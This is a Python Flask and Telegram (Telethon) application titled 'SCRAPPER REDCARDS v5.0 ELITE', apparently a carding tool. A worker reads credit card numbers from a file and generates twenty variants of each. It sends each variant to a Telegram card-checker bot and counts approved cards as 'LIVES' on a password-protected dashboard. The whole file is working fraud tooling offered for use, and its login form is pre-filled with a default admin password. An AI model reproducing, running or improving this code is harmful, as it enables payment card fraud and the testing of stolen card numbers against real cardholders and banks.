#!/usr/bin/env python3
"""SCRAPPER REDCARDS v5.0 ELITE - Encriptación Máxima"""
import threading, asyncio, os, random
from flask import Flask, render_template_string, request, jsonify, make_response, redirect
from telethon import TelegramClient
from telethon.errors import FloodWaitError, RPCError

from config import *
from database import db, lives_mgr, logger
from auth import login_user, logout_user, require_login
from utils import PasswordManager, CCGenerator

app = Flask(__name__)
app.secret_key = SECRET_KEY
client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
state = {'scraper_running': True, 'processed_ccs': 0, 'approved': 0, 'declined': 0}

HTML_LOGIN = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>🔐 Acceso Secreto</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:rgba(26,26,46,0.95);padding:50px;border-radius:20px;box-shadow:0 0 60px rgba(102,126,234,0.5);width:100%;max-width:400px;border:2px solid #667eea}
.header{text-align:center;margin-bottom:40px}
.logo{font-size:50px}
h1{color:#667eea;font-size:24px;margin:15px 0 5px}
.subtitle{color:#999;font-size:12px}
.form-group{margin-bottom:20px}
label{display:block;color:#999;font-weight:bold;margin-bottom:8px;font-size:12px;text-transform:uppercase}
input{width:100%;padding:14px;border:2px solid #667eea;background:rgba(102,126,234,0.1);border-radius:8px;color:#fff;font-size:14px}
input:focus{outline:none;border-color:#764ba2;box-shadow:0 0 15px rgba(102,126,234,0.3)}
button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold;margin-top:10px;box-shadow:0 5px 15px rgba(102,126,234,0.4)}
button:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(102,126,234,0.6)}
.error{color:#ff6b6b;font-size:12px;margin-top:10px;padding:12px;background:rgba(255,107,107,0.1);border-left:3px solid #ff6b6b;display:none}
.info{color:#4ecdc4;font-size:11px;text-align:center;margin-top:20px}
</style></head>
<body><div class="container"><div class="header"><div class="logo">🔐</div><h1>Team RedCards</h1><p class="subtitle">Acceso Encriptado v5.0</p></div>
<form id="form"><div class="form-group"><label>Usuario</label><input type="text" id="user" value="admin" required></div>
<div class="form-group"><label>Contraseña</label><input type="password" id="pass" value="ChangeMe123!@#" required></div>
<button type="submit">Acceder Encriptado</button><div id="err" class="error"></div><div class="info">🔒 Conexión encriptada</div></form></div>
<script>
document.getElementById('form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const err = document.getElementById('err');
    try {
        const r = await fetch('/api/login_secure', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({username: document.getElementById('user').value, password: document.getElementById('pass').value})
        });
        const d = await r.json();
        if (r.ok) {
            document.cookie = `session_token=${d.session_token}; path=/; secure; samesite=strict`;
            window.location.href = '/dashboard_secure';
        } else {
            err.textContent = d.error;
            err.style.display = 'block';
        }
    } catch (e) {
        err.textContent = 'Error de conexión';
        err.style.display = 'block';
    }
});
</script></body></html>"""

HTML_DASHBOARD = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>🔐 Dashboard</title><style>
*{margin:0;padding:0}
body{font-family:Arial;background:linear-gradient(135deg,#0f0f1e 0%,#1a1a2e 100%);color:#fff;min-height:100vh}
.container{max-width:1200px;margin:0 auto;padding:20px}
.header{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);padding:30px;border-radius:15px;margin-bottom:30px;display:flex;justify-content:space-between;align-items:center;border:2px solid #667eea}
h1{font-size:32px}
.logout{background:#ff6b6b;color:white;border:none;padding:10px 20px;border-radius:8px;cursor:pointer}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}
.card{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);padding:25px;border-radius:15px;border:2px solid #667eea}
.label{color:#999;font-size:12px}
.value{font-size:36px;font-weight:bold;color:#4ecdc4;margin-top:10px}
.section{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);padding:25px;border-radius:15px;margin-bottom:20px;border:2px solid #667eea}
.section h2{color:#4ecdc4;margin-bottom:15px}
.item{background:rgba(102,126,234,0.1);padding:12px;border-radius:8px;margin-bottom:10px;border-left:3px solid #4ecdc4}
.logs{max-height:300px;overflow-y:auto}
.log{font-size:11px;padding:5px;border-bottom:1px solid rgba(102,126,234,0.2);font-family:monospace}
</style></head>
<body><div class="container"><div class="header"><h1>🔐 Dashboard Encriptado</h1><button class="logout" onclick="logout()">Salir</button></div>
<div class="grid">
<div class="card"><div class="label">✅ Aprobadas</div><div class="value" id="approved">0</div></div>
<div class="card"><div class="label">❌ Declinadas</div><div class="value" id="declined">0</div></div>
<div class="card"><div class="label">🔄 Procesadas</div><div class="value" id="processed">0</div></div>
</div>
<div class="section"><h2>🔥 LIVES</h2><div id="lives"></div></div>
<div class="section logs"><h2>📊 Logs</h2><div id="logs"></div></div>
</div>
<script>
function refresh(){
    fetch('/api/stats_secure').then(r=>r.json()).then(d=>{document.getElementById('approved').textContent=d.approved;document.getElementById('declined').textContent=d.declined;document.getElementById('processed').textContent=d.processed_ccs});
    fetch('/api/lives_secure').then(r=>r.json()).then(d=>{const html=d.lives.length>0?d.lives.map(l=>`<div class="item">${l.cc}</div>`).join(''):'<p style="color:#999">Sin LIVES</p>';document.getElementById('lives').innerHTML=html});
    fetch('/api/logs_secure').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.reverse().slice(0,30).map(l=>`<div class="log">${l}</div>`).join('')});
}
function logout(){fetch('/api/logout_secure',{method:'POST'});document.cookie='session_token=;path=/;max-age=0';window.location.href='/';}
refresh();
setInterval(refresh,3000);
</script></body></html>"""

def init_app():
    logger.add("🚀 Iniciando Scrapper v5.0 ELITE")
    from auth import initialize_default_admin
    initialize_default_admin()
    logger.add("✅ Sistema listo")

@app.route('/')
def index():
    return redirect('/login')

@app.route('/login')
def secret_login():
    return render_template_string(HTML_LOGIN)

@app.route('/dashboard_secure')
@require_login
def dashboard_secure():
    return render_template_string(HTML_DASHBOARD)

@app.route('/api/login_secure', methods=['POST'])
def api_login_secure():
    data = request.json
    result, error = login_user(data.get('username', ''), data.get('password', ''))
    if error:
        return jsonify({'error': error})
    resp = make_response(jsonify({'success': True, 'session_token': result['session_token']}))
    resp.set_cookie('session_token', result['session_token'], max_age=86400, secure=True, httponly=True, samesite='Strict')
    return resp

@app.route('/api/logout_secure', methods=['POST'])
@require_login
def api_logout_secure():
    token = request.cookies.get('session_token')
    logout_user(token)
    resp = make_response(jsonify({'success': True}))
    resp.set_cookie('session_token', '', max_age=0)
    return resp

@app.route('/api/stats_secure')
@require_login
def api_stats_secure():
    return jsonify(state)

@app.route('/api/lives_secure')
@require_login
def api_lives_secure():
    return jsonify({'lives': lives_mgr.get_recent_lives(10)})

@app.route('/api/logs_secure')
@require_login
def api_logs_secure():
    return jsonify({'logs': logger.get_recent(50)})

async def scraper_worker(client):
    global state
    logger.add("🚀 Scraper iniciado")
    state['scraper_running'] = True
    while True:
        try:
            if not os.path.exists('ccs.txt'):
                await asyncio.sleep(15)
                continue
            with open('ccs.txt', 'r', encoding='utf-8') as f:
                ccs_list = [line.strip() for line in f if line.strip()]
            if not ccs_list:
                logger.add("⏳ Sin CCs")
                await asyncio.sleep(20)
                continue
            cc = ccs_list[0]
            logger.add(f"🔄 CC: {cc[:15]}...")
            variants, err = CCGenerator.generate_variants(cc, count=20)
            if err:
                logger.add(f"❌ Error: {err}")
                ccs_list.pop(0)
                with open('ccs.txt', 'w', encoding='utf-8') as f:
                    f.write('\n'.join(ccs_list) + '\n' if ccs_list else '')
                await asyncio.sleep(15)
                continue
            if os.path.exists('cmds.txt'):
                with open('cmds.txt', 'r', encoding='utf-8') as f:
                    cmds = [line.strip() for line in f if line.strip()]
            else:
                cmds = ['/check', '/validate', '/test']
            if not cmds:
                cmds = ['/check']
            logger.add("📤 Enviando 20 variantes...")
            for i, variant in enumerate(variants):
                try:
                    cmd = random.choice(cmds)
                    await client.send_message('@Alphachekerbot', f"{cmd} {variant}")
                    state['processed_ccs'] += 1
                    logger.add(f"✓ #{i+1}/20")
                    await asyncio.sleep(1.2)
                except FloodWaitError as e:
                    logger.add(f"⏸️ Espera {e.seconds}s")
                    await asyncio.sleep(e.seconds + 1)
                except Exception as e:
                    logger.add(f"❌ Error: {str(e)[:50]}")
                    await asyncio.sleep(1)
            logger.add("✅ Lote completado")
            ccs_list.pop(0)
            with open('ccs.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(ccs_list) + '\n' if ccs_list else '')
            await asyncio.sleep(21)
        except Exception as e:
            logger.add(f"❌ Error scraper: {str(e)[:80]}")
            await asyncio.sleep(20)

async def telegram_main(client):
    try:
        logger.add("📱 Telegram sin autenticación interactiva")
        if os.path.exists(SESSION_NAME):
            await client.connect()
            logger.add("✅ Sesión restaurada")
        await scraper_worker(client)
    except Exception as e:
        logger.add(f"⚠️ Telegram: {str(e)[:80]}")
        await scraper_worker(client)

def thread_telegram():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(telegram_main(client))

if __name__ == '__main__':
    init_app()
    t = threading.Thread(target=thread_telegram, daemon=True)
    t.start()
    logger.add(f"🚀 Servidor en puerto {PORT}")
    logger.add(f"🔐 ACCEDE: http://localhost:{PORT}/login")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
